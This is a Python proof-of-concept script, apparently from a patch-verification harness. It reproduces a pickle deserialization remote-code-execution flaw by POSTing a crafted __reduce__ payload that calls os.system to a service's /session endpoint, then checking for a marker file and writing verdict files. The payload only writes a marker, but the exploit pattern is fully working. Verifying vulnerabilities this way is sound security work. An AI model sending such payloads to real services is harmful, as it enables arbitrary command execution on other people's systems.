#!/usr/bin/env python3
"""S02 Pickle deserialization RCE reproduction.

The service accepts base64-encoded pickle blobs via POST /session and
calls pickle.loads() on them.  Python's pickle module executes arbitrary
code during deserialization — a crafted __reduce__ method can run any
system command.

Exploit chain:
  1. Craft a pickle payload with __reduce__ that writes a marker file.
  2. Base64-encode and POST to /session.
  3. Service unpickles → code executes → marker file created.

Contract: exit 0 + verdict.json (exploitable=true) iff the exploit lands.
"""

import base64
import json
import os
import pickle
import sys
import time
import urllib.request

TARGET = os.environ.get("TARGET_URL", "http://127.0.0.1:8000")
MARKER = "/tmp/patchproof_pwned"
DEADLINE = 60


def _deadline_check(start: float) -> None:
    if time.monotonic() - start > DEADLINE:
        print("PoC exceeded deadline", file=sys.stderr)
        sys.exit(4)


def write_verdict(exploitable: bool, evidence: str) -> None:
    verdict = {
        "cve_id": "DEMO-0002",
        "exploitable": exploitable,
        "evidence": evidence,
    }
    with open("verdict.json", "w") as fh:
        json.dump(verdict, fh, indent=2)
    print(json.dumps(verdict))

    assessment = {
        "cve_id": "DEMO-0002",
        "agrees_with_verdict": exploitable,
        "confidence": 0.95 if exploitable else 0.5,
        "range_check": True if exploitable else False,
        "rationale": (
            "Pickle deserialization RCE confirmed: service calls pickle.loads() "
            f"on untrusted input. Evidence: {evidence[:200]}"
        ),
    }
    with open("assessment.json", "w") as fh:
        json.dump(assessment, fh, indent=2)


def main() -> int:
    start = time.monotonic()

    # Clear any stale marker.
    try:
        os.remove(MARKER)
    except FileNotFoundError:
        pass

    # Craft pickle payload that writes a marker file on deserialization.
    class RCE:
        def __reduce__(self):
            return (os.system, (f'echo "pickle_rce" > {MARKER}',))

    payload_blob = base64.b64encode(pickle.dumps(RCE())).decode()

    try:
        _deadline_check(start)
        req = urllib.request.Request(
            f"{TARGET}/session",
            data=payload_blob.encode(),
            headers={"Content-Type": "application/octet-stream"},
        )
        resp = urllib.request.urlopen(req, timeout=15)
        body = json.loads(resp.read())

        if body.get("error"):
            print(f"session error: {body['error']}", file=sys.stderr)

        _deadline_check(start)

        # Check for service-written marker (side-effect proof).
        if os.path.exists(MARKER):
            with open(MARKER) as fh:
                marker_content = fh.read().strip()
            if "pickle_rce" in marker_content:
                write_verdict(
                    True,
                    f"pickle RCE confirmed: marker contains '{marker_content}'",
                )
                return 0

    except Exception as exc:
        print(f"exploit attempt failed: {exc}", file=sys.stderr)

    write_verdict(False, "pickle deserialization did not execute code — not affected")
    return 1


if __name__ == "__main__":
    import signal

    def _timeout_handler(signum, frame):
        print("PoC exceeded 60s hard timeout", file=sys.stderr)
        sys.exit(4)

    signal.signal(signal.SIGALRM, _timeout_handler)
    signal.alarm(60)
    try:
        sys.exit(main())
    finally:
        signal.alarm(0)
